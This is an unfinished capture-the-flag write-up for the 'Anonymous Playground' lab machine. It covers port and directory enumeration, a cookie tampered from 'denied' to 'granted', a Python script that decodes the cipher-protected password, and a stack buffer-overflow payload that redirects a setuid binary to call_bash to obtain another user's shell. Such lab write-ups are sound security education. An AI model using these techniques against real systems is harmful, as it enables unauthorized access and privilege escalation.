WIP
#### Flag 1
- I stared with a basic nmap scan on the top 1000 ports `nmap -sV IP -v`
- That revealed http and ssh, so I went to the website
- There was nothing interesting in the source code or pages I could find from source alone, so I used gobuster to enumerate
```
└─$ gobuster dir -u 10.10.51.244 -w /usr/share/dirb/wordlists/common.txt
```
- That brought me to the page `/robots.txt`
```
User-agent: *
Disallow: /zYdHuAKjP
```
- Navigating to the path, the page had an `access denied` message
- This usually indicates something to do with user agents or cookies, so I checked cookies first with inspect
- There was an `access` token with the value `denied` so I just changed it to `granted` and reloaded the page
- The access page had this string
```
hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
```
> Hint: You're going to want to write a Python script for this. 'zA' = 'a'
- From this I assumed that every two letters map to one letter, and some type of substitution cipher was at play
- If every two letters maps to one letter, then the username has to be 5 characters long
```
hE zA dC fH zA :: hE zA dC fH zA hA iJ zA eI aD jB cB hH gA zA fH fN
```
- In the `/operatives.php` page on the site, there is a list of usernames to test with this
- `magna` is the only username that matches the `zA` rule with an a for the second and last letter
- From this we know
```
hE = m
zA = a
dC = g
fH = n
zA = a
```
- Reconstructing the password so far `magna__a______an_`
- After thinking on it, I realized that the resulting letter is the index of the sum of the indexes of the two letters
- ex// f = 6 and h = 8 becomes n = 14
```python
# yes you have to write it as a list don't use list(), I used code to do that cus I'm lazy
alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
cipher = ['hE', 'zA', 'dC', 'fH', 'zA', 'hA', 'iJ', 'zA', 'eI', 'aD', 'jB', 'cB', 'hH', 'gA', 'zA', 'fH', 'fN']

passwd = []

for letter in cipher:
    l1 = int(alphabet.index(letter[0].lower())) + 1
    l2 = int(alphabet.index(letter[1].lower())) + 1

    s = l1 + l2

    if s == 27:
        passwd.append('a')
    else:
        ch = alphabet[s - 1]
        passwd.append(ch)

print(''.join(passwd))
```
- Result: `magnaisanelephant`
```
magna@anonymous-playground:~$ ls
flag.txt  hacktheworld  note_from_spooky.txt
magna@anonymous-playground:~$ cat flag.txt
```
- First flag down two to go
#### Flag 2
- `sudo -l` showed that magna can't run sudo at all, so we have to escalate privs some other way
- There were two notable files in magna's home directory
```
-rwsr-xr-x 1 root   root   8528 Jul 10  2020 hacktheworld
-rw-r--r-- 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt
```
- `hacktheworld` has the suid bit set, so I focused on that file
```
magna@anonymous-playground:~$ strings hacktheworld 
/lib64/ld-linux-x86-64.so.2
)Kk1
libc.so.6
setuid
...
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
/bin/sh
Who do you want to hack?
...
[ ETC ]
```
- There were no explicit file calls to manipulate here, so I assumed it required actual reverse engineering 
- I _really_ didn't want to do that, but considering the note from spooky:
```
Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
```
- I don't think I have a choice </3
- Since `radare2` is installed, I used that to analyze the code
- The `main` function prints the strings, then completes the setuid action (setting it to 1337 for spooky) before running /bin/sh
- From this we can deduce it is some type of buffer overflow (probably stack based)
- There are definitely more technical ways to do this to find the buffer size, but I decided to use trial and error
```
magna@anonymous-playground:~$ for i in {1..80}; do echo $i; python -c "print('A' * $i)" | ./hacktheworld; done
1
Who do you want to hack? 2
Who do you want to hack? 3
Who do you want to hack? 4
...
Who do you want to hack? 72
Segmentation fault (core dumped)
```
- This verifies that buffer overflow si the method to go through with
- Since this is a binary file I used readelf to find where the bash fuction is executed (you can also use radare2 -> s bash)
```
magna@anonymous-playground:~$ readelf -a hacktheworld | grep bash
    50: 0000000000400657   129 FUNC    GLOBAL DEFAULT   13 call_bash
```
- Using this address we can create the python payload
```python
#!/usr/bin/env python
from struct import *

b = ""
b += "A" * 64                      
b += pack("<Q", 0x0000000000400657)   
print(b)
```
- Then run it with `(python pload.py; cat) | ./hacktheworld` - note python instead of python3 to avoid byte errors
```
magna@anonymous-playground:~$ (python pload.py; cat) | ./hacktheworld
Who do you want to hack? 
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
whoami
spooky
python -c 'import pty;pty.spawn("/bin/bash")'                
spooky@anonymous-playground:~$ cd ../spooky
spooky@anonymous-playground:/home/spooky$ cat flag.txt
```
- Tip - if your shell gets frozen bc of questionable laptop specs (like mine) CTRL+Z to suspend the python script and rerun it
#### Flag 3
- I don't know spooky's password, so I start by checking crontab
 
